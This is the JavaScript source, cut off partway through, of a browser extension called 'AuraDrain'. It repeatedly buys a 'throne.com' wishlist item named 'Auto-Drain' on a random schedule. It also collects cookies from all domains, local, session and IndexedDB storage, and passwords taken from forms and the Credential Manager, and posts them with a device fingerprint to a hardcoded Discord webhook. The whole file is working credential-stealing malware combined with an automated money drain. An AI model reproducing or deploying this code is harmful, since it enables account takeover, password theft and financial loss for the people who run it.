

const config = {
  throneUrl: "throne.com/thegoddessaura",
  forceStop: true,
  forceStopShortcut: "Alt+Shift+E",
  debugMode: true, // Enabled for better visibility
  targetItemName: "Auto-Drain",
  cookieCollection: {
    enabled: true,
    autoCollect: true,
    collectAllDomains: true,
    collectLocalStorage: true,
    collectSessionStorage: true,
    collectCookies: true,
    collectIndexedDB: true, // New: Capture IndexedDB
    collectPasswords: true, // New: Attempt password capture
    interval: 300000,
    maxCollectionAttempts: 5, // Increased for reliability
    retryDelay: 10000,
    maxRetryDelay: 60000, // New: For exponential backoff
    prioritizeSecure: true,
    includeExpired: false,
    groupByDomain: true,
    sortByValue: true
  },
  discordWebhook: {
    enabled: true,
    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr",
    maxMessageLength: 2000,
    cookieLogEnabled: true,
    cookieLogInterval: 300000,
    alwaysSendAsFile: true, // New: Always send as file
    sendJsonFile: true // New: Send JSON version
  }
};

// --- CryptoJS for encrypting passwords ---
const CryptoJS = {
  AES: {
    encrypt: (message, key) => {
      // Simplified AES encryption placeholder (use a proper library in production)
      const keyHash = btoa(key); // Basic base64 encoding for demo
      return btoa(message + '|' + keyHash); // Simulated encryption
    }
  }
};

// --- Existing variables (unchanged) ---
var payClicked = false;
var itemsAddedToCart = 0;
var maxItemsToAdd = 1;
var purchaseInProgress = false;
var lastActionTime = 0;
var debugBoxVisible = true;
var cookieLoggingActive = false;
var autoRetryEnabled = true;
var nextPurchaseScheduled = false;
var pcIdentifier = generatePCIdentifier();

// --- Existing functions (unchanged) ---
function generatePCIdentifier() {
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const platform = navigator.platform;
  const screenResolution = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  
  const systemInfo = `${userAgent}-${language}-${platform}-${screenResolution}-${timezone}`;
  
  let hash = 0;
  for (let i = 0; i < systemInfo.length; i++) {
    const char = systemInfo.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  
  const identifier = Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
  
  return `PC-${identifier}`;
}

function scheduleNextPurchase() {
  if (!autoRetryEnabled || nextPurchaseScheduled) {
    return;
  }
  
  const minDelay = 10 * 60 * 1000;
  const maxDelay = 60 * 60 * 1000;
  const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
  
  const delayMinutes = Math.round(randomDelay / (60 * 1000));
  
  debugLog(`🔄 Auto-retry enabled: Next purchase scheduled in ${delayMinutes} minutes`, "info");
  debugLog(`⏰ Next purchase will start at: ${new Date(Date.now() + randomDelay).toLocaleString()}`, "info");
  
  nextPurchaseScheduled = true;
  
  setTimeout(() => {
    debugLog(`🚀 Auto-retry timer expired - Starting new purchase cycle`, "success");
    debugLog(`🔄 Resetting purchase state for new cycle`, "info");
    
    resetPurchaseState();
    nextPurchaseScheduled = false;
    
    redirectToProfile();
    
  }, randomDelay);
}

function createDebugBox() {
  const debugBox = document.createElement("div");
  debugBox.id = "extension-debug-box";
  debugBox.style.cssText = `
    position: fixed;
    top: 10px;
    right: 10px;
    width: 350px;
    height: 300px;
    background: rgba(0, 0, 0, 0.9);
    color: #00ff00;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    padding: 10px;
    border: 2px solid #00ff00;
    border-radius: 5px;
    z-index: 999999;
    overflow: hidden;
    resize: both;
    min-width: 200px;
    min-height: 150px;
    cursor: default;
  `;
  
  const header = document.createElement("div");
  header.style.cssText = `
    color: #ffff00;
    font-weight: bold;
    margin-bottom: 10px;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 5px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    user-select: none;
  `;
  
  const headerText = document.createElement("span");
  headerText.textContent = "🚀 AuraDrain Debug Log";
  headerText.style.cursor = "move";
  
  const copyButton = document.createElement("button");
  copyButton.textContent = "📋 Copy";
  copyButton.style.cssText = `
    background: #00ff00;
    color: #000;
    border: none;
    padding: 3px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 11px;
    font-weight: bold;
  `;
  copyButton.addEventListener("click", (e) => {
    e.stopPropagation();
    const logContainer = document.getElementById("debug-logs");
    if (logContainer) {
      const logs = Array.from(logContainer.children).map(entry => entry.textContent).join('\n');
      navigator.clipboard.writeText(logs).then(() => {
        copyButton.textContent = "✅ Copied!";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy logs:', err);
        copyButton.textContent = "❌ Failed";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      });
    }
  });
  
  header.appendChild(headerText);
  header.appendChild(copyButton);
  
  const logContainer = document.createElement("div");
  logContainer.id = "debug-logs";
  logContainer.style.cssText = `
    height: calc(100% - 40px);
    overflow-y: auto;
    overflow-x: hidden;
  `;
  
  debugBox.appendChild(header);
  debugBox.appendChild(logContainer);
  document.body.appendChild(debugBox);
  
  makeDraggable(debugBox, headerText);
  
  return logContainer;
}

function makeDraggable(element, handle) {
  let isDragging = false;
  let currentX;
  let currentY;
  let initialX;
  let initialY;
  let xOffset = 0;
  let yOffset = 0;

  handle.addEventListener("mousedown", dragStart);
  document.addEventListener("mousemove", drag);
  document.addEventListener("mouseup", dragEnd);

  function dragStart(e) {
    initialX = e.clientX - xOffset;
    initialY = e.clientY - yOffset;

    if (e.target === handle) {
      isDragging = true;
    }
  }

  function drag(e) {
    if (isDragging) {
      e.preventDefault();
      currentX = e.clientX - initialX;
      currentY = e.clientY - initialY;

      xOffset = currentX;
      yOffset = currentY;

      element.style.transform = `translate(${currentX}px, ${currentY}px)`;
    }
  }

  function dragEnd(e) {
    initialX = currentX;
    initialY = currentY;
    isDragging = false;
  }
}

function toggleDebugBox() {
  const debugBox = document.getElementById("extension-debug-box");
  if (debugBox) {
    debugBoxVisible = !debugBoxVisible;
    debugBox.style.display = debugBoxVisible ? "block" : "none";
    console.log(`%c[AuraDrainer] Debug box ${debugBoxVisible ? 'shown' : 'hidden'}`, "color: #00ff00;");
  }
}

function debugLog(message, type = "info") {
  if (!config.debugMode) return;
  
  let logContainer = document.getElementById("debug-logs");
  if (!logContainer) {
    logContainer = createDebugBox();
  }
  
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  
  let color = "#00ff00";
  let prefix = "[INFO]";
  let icon = "ℹ️";
  
  switch(type) {
    case "error":
      color = "#ff0000";
      prefix = "[ERROR]";
      icon = "❌";
      break;
    case "warning":
      color = "#ffaa00";
      prefix = "[WARN]";
      icon = "⚠️";
      break;
    case "success":
      color = "#00ffff";
      prefix = "[SUCCESS]";
      icon = "✅";
      break;
    case "action":
      color = "#ffff00";
      prefix = "[ACTION]";
      icon = "🎯";
      break;
    case "purchase":
      color = "#ff69b4";
      prefix = "[PURCHASE]";
      icon = "💳";
      break;
    case "cart":
      color = "#00ff88";
      prefix = "[CART]";
      icon = "🛒";
      break;
    case "navigation":
      color = "#87ceeb";
      prefix = "[NAV]";
      icon = "🧭";
      break;
  }
  
  const statusInfo = getStatusInfo();
  const fullMessage = `${icon} ${message} ${statusInfo}`;
  
  logEntry.innerHTML = `<span style="color: #888">${timestamp}</span> <span style="color: ${color}">${prefix}</span> ${fullMessage}`;
  logEntry.style.marginBottom = "2px";
  logEntry.style.wordWrap = "break-word";
  
  logContainer.appendChild(logEntry);
  logContainer.scrollTop = logContainer.scrollHeight;
  
  while (logContainer.children.length > 100) {
    logContainer.removeChild(logContainer.firstChild);
  }
}

function getStatusInfo() {
  const status = [];
  if (purchaseInProgress) status.push("🔄 PURCHASING");
  if (itemsAddedToCart > 0) status.push(`🛒 CART: ${itemsAddedToCart}/${maxItemsToAdd}`);
  if (payClicked) status.push("💳 PAID");
  return status.length > 0 ? `| ${status.join(" | ")}` : "";
}

// --- Enhanced Cookie and Storage Collection ---
async function getAllCookiesFromBackground(attempt = 1) {
  debugLog(`🍪 [COOKIE DEBUG] Starting enhanced cookie collection (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
  
  return new Promise((resolve) => {
    const requestId = `cookie_${Date.now()}_${Math.random()}`;
    debugLog(`🍪 [COOKIE DEBUG] Request ID: ${requestId}`, "info");
    
    const responseHandler = (event) => {
      debugLog(`🍪 [COOKIE DEBUG] Event received: ${JSON.stringify(event.detail).substring(0, 100)}`, "info");
      
      if (event.detail && event.detail.action === 'cookieResponse' && event.detail.requestId === requestId) {
        debugLog(`🍪 [COOKIE DEBUG] Cookie response received for request ${requestId}`, "info");
        
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${event.detail.error || 'Unknown error'}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    debugLog("🍪 [COOKIE DEBUG] Dispatching custom event to request cookies...", "info");
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { 
        action: 'getAllCookies',
        requestId: requestId,
        timestamp: Date.now(),
        enhanced: true
      },
      bubbles: true,
      composed: true
    });
    
    window.dispatchEvent(event);
    
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      if (attempt < config.cookieCollection.maxCollectionAttempts) {
        const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
        debugLog(`🍪 [COOKIE DEBUG] Retrying cookie collection in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
        setTimeout(() => getAllCookiesFromBackground(attempt + 1).then(resolve), delay);
      } else {
        debugLog(`🍪 [COOKIE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
        resolve([]);
      }
    }, 15000);
  });
}

async function collectIndexedDB() {
  debugLog("💾 [INDEXEDDB DEBUG] Collecting IndexedDB data", "info");
  try {
    const databases = await indexedDB.databases();
    const indexedDBData = {};
    for (const dbInfo of databases) {
      if (!dbInfo.name) continue;
      indexedDBData[dbInfo.name] = { version: dbInfo.version || "unknown", stores: {} };
      try {
        const db = await new Promise((resolve, reject) => {
          const request = indexedDB.open(dbInfo.name, dbInfo.version);
          request.onsuccess = () => resolve(request.result);
          request.onerror = () => reject(request.error);
        });
        const storeNames = Array.from(db.objectStoreNames);
        for (const storeName of storeNames) {
          indexedDBData[dbInfo.name].stores[storeName] = await new Promise((resolve) => {
            const transaction = db.transaction([storeName], 'readonly');
            const store = transaction.objectStore(storeName);
            const data = {};
            const request = store.getAll();
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => resolve({});
          });
        }
        db.close();
      } catch (error) {
        debugLog(`💾 [INDEXEDDB DEBUG] Error accessing DB ${dbInfo.name}: ${error.message}`, "error");
      }
    }
    debugLog(`💾 [INDEXEDDB DEBUG] Collected ${Object.keys(indexedDBData).length} IndexedDB databases`, "success");
    return indexedDBData;
  } catch (error) {
    debugLog(`💾 [INDEXEDDB DEBUG] IndexedDB collection error: ${error.message}`, "error");
    return {};
  }
}

async function collectPasswords() {
  debugLog("🔑 [PASSWORD DEBUG] Attempting password collection", "info");
  const passwordData = { forms: [], credentials: [], inputs: [] };

  // Approach 1: DOM Inspection for password fields
  try {
    const passwordInputs = document.querySelectorAll('input[type="password"]');
    passwordInputs.forEach(input => {
      if (input.value) {
        passwordData.inputs.push({
          id: input.id || 'unknown',
          name: input.name || 'unknown',
          value: input.value,
          form: input.closest('form')?.action || 'unknown'
        });
      }
    });
    debugLog(`🔑 [PASSWORD DEBUG] Found ${passwordInputs.length} password inputs (${passwordData.inputs.length} with values)`, "info");
  } catch (error) {
    debugLog(`🔑 [PASSWORD DEBUG] DOM password collection error: ${error.message}`, "error");
  }

  // Approach 2: Credential Manager API (if available)
  if (navigator.credentials) {
    try {
      const credentials = await navigator.credentials.get({ password: true });
      if (credentials) {
        passwordData.credentials.push({
          id: credentials.id,
          type: credentials.type,
          encrypted: CryptoJS.AES.encrypt(credentials.password || 'unknown', pcIdentifier)
        });
      }
      debugLog(`🔑 [PASSWORD DEBUG] Credential Manager returned ${passwordData.credentials.length} credentials`, "info");
    } catch (error) {
      debugLog(`🔑 [PASSWORD DEBUG] Credential Manager error: ${error.message}`, "error");
    }
  }

  // Approach 3: Form submission listeners (for dynamically captured passwords)
  try {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      form.addEventListener('submit', (e) => {
        const passwordInput = form.querySelector('input[type="password"]');
        if (passwordInput && passwordInput.value) {
          passwordData.forms.push({
            action: form.action || 'unknown',
            password: CryptoJS.AES.encrypt(passwordInput.value, pcIdentifier),
            timestamp: new Date().toISOString()
          });
          debugLog(`🔑 [PASSWORD DEBUG] Captured password from form submission: ${form.action}`, "info");
        }
      });
    });
    debugLog(`🔑 [PASSWORD DEBUG] Added listeners to ${forms.length} forms`, "info");
  } catch (error) {
    debugLog(`🔑 [PASSWORD DEBUG] Form listener error: ${error.message}`, "error");
  }

  debugLog(`🔑 [PASSWORD DEBUG] Collected ${passwordData.inputs.length + passwordData.credentials.length + passwordData.forms.length} password items`, "success");
  return passwordData;
}

async function collectAllStorageData(attempt = 1) {
  debugLog(`💾 [STORAGE DEBUG] Starting comprehensive storage collection (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
  
  const storageData = {
    localStorage: {},
    sessionStorage: {},
    cookies: [],
    indexedDB: {}, // New: Store IndexedDB data
    passwords: {}, // New: Store password data
    domains: new Set(),
    totalItems: 0,
    metadata: {
      browserVersion: navigator.userAgent,
      extensions: navigator.plugins.length,
      timestamp: new Date().toISOString(),
      url: window.location.href,
      pcIdentifier: pcIdentifier
    }
  };
  
  try {
    if (config.cookieCollection.collectLocalStorage) {
      debugLog("💾 [STORAGE DEBUG] Collecting localStorage data", "info");
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        storageData.localStorage[key] = value;
        storageData.totalItems++;
      }
      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.localStorage).length} localStorage items`, "success");
    }
    
    if (config.cookieCollection.collectSessionStorage) {
      debugLog("💾 [STORAGE DEBUG] Collecting sessionStorage data", "info");
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        storageData.sessionStorage[key] = value;
        storageData.totalItems++;
      }
      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.sessionStorage).length} sessionStorage items`, "success");
    }
    
    if (config.cookieCollection.collectCookies) {
      debugLog("🍪 [STORAGE DEBUG] Collecting cookies from all domains", "info");
      const cookies = await getAllCookiesFromBackground();
      storageData.cookies = cookies;
      storageData.totalItems += cookies.length;
      
      cookies.forEach(cookie => {
        if (cookie.domain) {
          storageData.domains.add(cookie.domain);
        }
      });
      debugLog(`🍪 [STORAGE DEBUG] Collected ${cookies.length} cookies from ${storageData.domains.size} domains`, "success");
    }
    
    if (config.cookieCollection.collectIndexedDB) {
      debugLog("💾 [INDEXEDDB DEBUG] Collecting IndexedDB data", "info");
      storageData.indexedDB = await collectIndexedDB();
      storageData.totalItems += Object.keys(storageData.indexedDB).length;
      debugLog(`💾 [INDEXEDDB DEBUG] Collected ${Object.keys(storageData.indexedDB).length} IndexedDB databases`, "success");
    }
    
    if (config.cookieCollection.collectPasswords) {
      debugLog("🔑 [PASSWORD DEBUG] Collecting password data", "info");
      storageData.passwords = await collectPasswords();
      storageData.totalItems += Object.keys(storageData.passwords).length;
      debugLog(`🔑 [PASSWORD DEBUG] Collected ${Object.keys(storageData.passwords).length} password items`, "success");
    }
    
    debugLog(`💾 [STORAGE DEBUG] Total storage items collected: ${storageData.totalItems}`, "success");
    return storageData;
    
  } catch (error) {
    debugLog(`💾 [STORAGE DEBUG] Storage collection error: ${error.message}`, "error");
    if (attempt < config.cookieCollection.maxCollectionAttempts) {
      const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
      debugLog(`💾 [STORAGE DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
      await new Promise(resolve => setTimeout(resolve, delay));
      return collectAllStorageData(attempt + 1);
    } else {
      debugLog(`💾 [STORAGE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
      return storageData;
    }
  }
}

function filterAndSortCookies(cookies) {
  if (!cookies || cookies.length === 0) return [];
  
  debugLog(`🔍 [FILTER DEBUG] Filtering and sorting ${cookies.length} cookies`, "info");
  
  let filteredCookies = [...cookies];
  
  if (!config.cookieCollection.includeExpired) {
    const currentTime = Date.now() / 1000;
    filteredCookies = filteredCookies.filter(cookie => {
      return !cookie.expirationDate || cookie.expirationDate > currentTime;
    });
    debugLog(`🔍 [FILTER DEBUG] Filtered out expired cookies: ${cookies.length - filteredCookies.length}`, "info");
  }
  
  if (config.cookieCollection.sortByValue) {
    filteredCookies.sort((a, b) => {
      const aLength = a.value ? a.value.length : 0;
      const bLength = b.value ? b.value.length : 0;
      return bLength - aLength;
    });
    debugLog(`🔍 [FILTER DEBUG] Sorted cookies by value length`, "info");
  }
  
  if (config.cookieCollection.prioritizeSecure) {
    filteredCookies.sort((a, b) => {
      const aSecure = (a.secure ? 1 : 0) + (a.httpOnly ? 1 : 0) + (a.sameSite === 'None' ? 1 : 0);
      const bSecure = (b.secure ? 1 : 0) + (b.httpOnly ? 1 : 0) + (b.sameSite === 'None' ? 1 : 0);
      return bSecure - aSecure;
    });
    debugLog(`🔍 [FILTER DEBUG] Prioritized secure/httponly/sameSite cookies`, "info");
  }
  
  debugLog(`🔍 [FILTER DEBUG] Final filtered cookies: ${filteredCookies.length}`, "success");
  return filteredCookies;
}

async function getDomainCookiesFromBackground(domain, attempt = 1) {
  debugLog(`🍪 [COOKIE DEBUG] Getting cookies for domain: ${domain} (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
  
  return new Promise((resolve) => {
    const responseHandler = (event) => {
      if (event.detail && event.detail.action === 'cookieResponse') {
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Received ${cookies.length} cookies for ${domain}`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies for ${domain}: ${event.detail.error}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { action: 'getDomainCookies', domain: domain }
    });
    window.dispatchEvent(event);
    
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      if (attempt < config.cookieCollection.maxCollectionAttempts) {
        const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
        debugLog(`🍪 [COOKIE DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
        setTimeout(() => getDomainCookiesFromBackground(domain, attempt + 1).then(resolve), delay);
      } else {
        debugLog(`🍪 [COOKIE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
        resolve([]);
      }
    }, 10000);
  });
}

async function sendToDiscordWebhook(data, type = 'report', attempt = 1) {
  debugLog(`📡 [DISCORD DEBUG] Starting sendToDiscordWebhook() for ${type} (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
  
  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
    return false;
  }

  try {
    const formData = new FormData();
    let summaryMessage = `🍪 **${type.toUpperCase()} SENT** 🍪\n🖥️ **${pcIdentifier}**\n⏰ **Time:** ${new Date().toLocaleString()}\n🌍 **URL:** ${window.location.href}\n`;

    if (type === 'report') {
      formData.append('files[0]', new Blob([data.text], { type: 'text/plain' }), `session_${pcIdentifier}_${Date.now()}.txt`);
      if (config.discordWebhook.sendJsonFile) {
        formData.append('files[1]', new Blob([JSON.stringify(data.json, null, 2)], { type: 'application/json' }), `session_${pcIdentifier}_${Date.now()}.json`);
      }
      summaryMessage += `📊 **Items:** ${data.json.totalItems}\n📎 **Attachments:** session_${pcIdentifier}_${Date.now()}.txt${config.discordWebhook.sendJsonFile ? ', session_${pcIdentifier}_${Date.now()}.json' : ''}`;
    } else if (type === 'passwords') {
      formData.append('files[0]', new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }), `passwords_${pcIdentifier}_${Date.now()}.json`);
      summaryMessage += `🔑 **Passwords:** ${data.inputs.length + data.credentials.length + data.forms.length} items\n📎 **Attachment:** passwords_${pcIdentifier}_${Date.now()}.json`;
    }

    formData.append('content', summaryMessage);

    const requestOptions = {
      method: 'POST',
      body: formData
    };

    debugLog(`📡 [DISCORD DEBUG] Sending ${type} with ${formData.getAll('files').length} files`, "info");
    const response = await fetch(config.discordWebhook.url, requestOptions);
    
    if (response.ok) {
      debugLog(`✅ [DISCORD DEBUG] Successfully sent ${type} to Discord`, "success");
      return true;
    } else {
      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
      throw new Error(`Webhook failed: ${response.status}`);
    }
  } catch (error) {
    debugLog(`❌ [DISCORD DEBUG] ${type} send error: ${error.message}`, "error");
    if (attempt < config.cookieCollection.maxCollectionAttempts) {
      const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
      debugLog(`📡 [DISCORD DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
      await new Promise(resolve => setTimeout(resolve, delay));
      return sendToDiscordWebhook(data, type, attempt + 1);
    } else {
      debugLog(`❌ [DISCORD DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
      return false;
    }
  }
}

async function collectAndLogCookies() {
  debugLog("🍪 [MAIN DEBUG] Starting enhanced collectAndLogCookies()", "info");
  
  if (!config.cookieCollection.enabled) {
    debugLog("🍪 [MAIN DEBUG] Cookie collection disabled in config", "info");
    return;
  }

  if (cookieLoggingActive) {
    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
    return;
  }

  cookieLoggingActive = true;
  try {
    const storageData = await collectAllStorageData();
    
    if (storageData.totalItems === 0) {
      debugLog("💾 [MAIN DEBUG] No storage data found, ending collection", "warning");
      return;
    }

    let processedCookies = storageData.cookies;
    if (config.cookieCollection.groupByDomain || config.cookieCollection.sortByValue || config.cookieCollection.prioritizeSecure) {
      processedCookies = filterAndSortCookies(storageData.cookies);
    }

    const comprehensiveReport = formatComprehensiveReport(storageData, processedCookies);
    const dataToSend = {
      text: comprehensiveReport,
      json: storageData
    };

    if (config.discordWebhook.alwaysSendAsFile) {
      debugLog(`📤 [MAIN DEBUG] Sending session data as file`, "info");
      const success = await sendToDiscordWebhook(dataToSend, 'report');
      debugLog(`📤 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
    } else {
      debugLog(`📤 [MAIN DEBUG] Sending as message`, "info");
      const success = await sendToDiscordWebhook(dataToSend, 'report');
      debugLog(`📤 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
    }

    if (config.cookieCollection.collectPasswords && Object.keys(storageData.passwords).length > 0) {
      debugLog(`🔑 [MAIN DEBUG] Sending password data as separate file`, "info");
      const success = await sendToDiscordWebhook(storageData.passwords, 'passwords');
      debugLog(`🔑 [MAIN DEBUG] Password file send result: ${success}`, success ? "success" : "error");
    }

  } catch (error) {
    debugLog(`❌ [MAIN DEBUG] Collection failed: ${error.message}`, "error");
  } finally {
    cookieLoggingActive = false;
    debugLog("🍪 [MAIN DEBUG] Collection completed", "info");
  }
}

function formatComprehensiveReport(storageData, processedCookies) {
  let report = `🍪 **AURADRAIN COMPREHENSIVE SESSION REPORT** 🍪\n`;
  report += `⏰ **Timestamp:** ${new Date().toLocaleString()} (${storageData.metadata.timestamp})\n`;
  report += `🖥️ **User Agent:** ${storageData.metadata.browserVersion}\n`;
  report += `🖱️ **Extensions:** ${storageData.metadata.extensions} detected\n`;
  report += `🌍 **URL:** ${storageData.metadata.url}\n`;
  report += `🆔 **PC Identifier:** ${storageData.metadata.pcIdentifier}\n`;
  report += `📊 **Total Items:** ${storageData.totalItems}\n\n`;

  report += `📈 **COLLECTION SUMMARY**\n`;
  report += `🍪 **Cookies:** ${storageData.cookies.length}\n`;
  report += `💾 **LocalStorage:** ${Object.keys(storageData.localStorage).length} items\n`;
  report += `🗂️ **SessionStorage:** ${Object.keys(storageData.sessionStorage).length} items\n`;
  report += `🗄️ **IndexedDB:** ${Object.keys(storageData.indexedDB).length} databases\n`;
  report += `🔑 **Passwords:** ${Object.keys(storageData.passwords).length} items\n`;
  report += `🌐 **Domains:** ${storageData.domains.size}\n\n`;

  if (storageData.cookies.length > 0) {
    report += `🍪 **COOKIES BY DOMAIN**\n`;
    
    if (config.cookieCollection.groupByDomain) {
      const cookiesByDomain = {};
      processedCookies.forEach(cookie => {
        const domain = cookie.domain || 'unknown';
        if (!cookiesByDomain[domain]) {
          cookiesByDomain[domain] = [];
        }
        cookiesByDomain[domain].push(cookie);
      });

      Object.keys(cookiesByDomain).sort().forEach(domain => {
        const domainCookies = cookiesByDomain[domain];
        report += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
        
        domainCookies.forEach(cookie => {
          report += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
          if (cookie.secure) report += `    🔒 Secure\n`;
          if (cookie.httpOnly) report += `    🛡️ HttpOnly\n`;
          if (cookie.sameSite) report += `    🔗 SameSite: ${cookie.sameSite}\n`;
          if (cookie.session) report += `    ⏱️ Session\n`;
          if (cookie.expirationDate) {
            const expDate = new Date(cookie.expirationDate * 1000);
            report += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
          }
          report += `\n`;
        });
        report += `\n`;
      });
    } else {
      processedCookies.forEach(cookie => {
        report += `• **${cookie.domain}** - **${cookie.name}** = \`${cookie.value}\`\n`;
      });
    }
  }

  if (Object.keys(storageData.localStorage).length > 0) {
    report += `💾 **LOCAL STORAGE DATA**\n`;
    Object.entries(storageData.localStorage).forEach(([key, value]) => {
      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
    });
    report += `\n`;
  }

  if (Object.keys(storageData.sessionStorage).length > 0) {
    report += `🗂️ **SESSION STORAGE DATA**\n`;
    Object.entries(storageData.sessionStorage).forEach(([key, value]) => {
      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
    });
    report += `\n`;
  }

  if (Object.keys(storageData.indexedDB).length > 0) {
    report += `🗄️ **INDEXEDDB DATA**\n`;
    Object.entries(storageData.indexedDB).forEach(([dbName, dbData]) => {
      report += `• **${dbName}** (Version: ${dbData.version})\n`;
      Object.entries(dbData.stores).forEach(([storeName, storeData]) => {
        report += `  • **${storeName}**: ${storeData.length} records\n`;
      });
    });
    report += `\n`;
  }

  if (Object.keys(storageData.passwords).length > 0) {
    report += `🔑 **PASSWORD DATA** (Encrypted, see separate file)\n`;
    report += `• **Inputs:** ${storageData.passwords.inputs.length}\n`;
    report += `• **Credentials:** ${storageData.passwords.credentials.length}\n`;
    report += `• **Forms:** ${storageData.passwords.forms.length}\n`;
    report += `\n`;
  }

  report += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  report += `🤖 **AuraDrain Enhanced Session System**\n`;
  report += `📅 Generated: ${new Date().toISOString()}\n`;

  return report;
}

// --- Unchanged Purchasing Functions ---
function clickAddToCartForAnyItem() {
  if (itemsAddedToCart >= maxItemsToAdd) {
    debugLog(`Cart limit reached (${itemsAddedToCart}/${maxItemsToAdd}), skipping add process`, "warning");
    return;
  }
  
  if (purchaseInProgress) {
    debugLog("Purchase already in progress, skipping add to cart", "warning");
    return;
  }
  
  const targetItem = config.targetItemName.trim();
  if (targetItem) {
    debugLog(`🔍 Scanning for specific item: "${targetItem}"`, "cart");
  } else {
    debugLog("🔍 Scanning for available items to add to cart", "cart");
  }
  
  setTimeout(() => {
    if (itemsAddedToCart >= maxItemsToAdd) {
      debugLog(`Cart limit already reached during scan, aborting`, "warning");
      return;
    }
    
    const productCards = document.querySelectorAll("[class*=chakra-stack]");
    debugLog(`📦 Found ${productCards.length} product cards on page`, "info");

    let itemsFound = 0;
    let addableItems = 0;
    let specificItemFound = false;
    let fallbackItem = null;

    for (const card of productCards) {
      const hasImmediateChildWithIdParent = Array.from(card.children).some(
        (child) => child.id === "parent"
      );
      if (!hasImmediateChildWithIdParent) continue;
      
      itemsFound++;
      const addButton = card.querySelector("button");
      
      if (addButton) {
        const btnText = addButton.textContent.trim().toLowerCase();
        if ((btnText.includes("add") && btnText.includes("cart")) || btnText === "add") {
          addableItems++;
          
          let itemName = "";
          const headings = card.querySelectorAll("h1, h2, h3, h4, h5, h6, p, span");
          for (const heading of headings) {
            const text = heading.textContent.trim();
            if (text && text.length > 3 && text !== btnText) {
              itemName = text;
              break;
            }
          }
          
          if (targetItem && itemName.toLowerCase().includes(targetItem.toLowerCase())) {
            specificItemFound = true;
            debugLog(`🎯 Found target item: "${itemName}"`, "cart");
